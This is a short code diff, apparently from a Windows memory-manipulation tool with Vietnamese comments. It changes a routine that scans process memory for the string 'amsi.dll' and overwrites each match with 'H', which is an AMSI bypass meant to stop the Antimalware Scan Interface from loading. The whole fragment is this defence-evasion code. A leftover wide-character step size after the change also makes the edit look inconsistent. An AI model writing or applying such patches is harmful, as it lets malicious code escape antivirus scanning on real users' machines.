@@ -575,10 +575,10 @@ void EnumeratePrivateMemory()
 
             while (remainingSize > 0)
             {
-                uintptr_t found = FindFirstStringW(
+                uintptr_t found = FindFirstString(
                     scanAddress,
                     remainingSize,
-                    L"amsi.dll"
+                    "amsi.dll"
                 );
 
                 if (!found)
@@ -587,7 +587,8 @@ void EnumeratePrivateMemory()
                 DEBUG("Found string at: %p", (void*)found);
 
                 // xử lý found ở đây
-                wchar_t patchAmsi = L'H';
+                //wchar_t patchAmsi = L'H';
+                char patchAmsi = 'H';
                 PatchProcedure((PVOID)found, (BYTE*)&patchAmsi, sizeof(char));
 
                 uintptr_t next = found + sizeof(wchar_t);
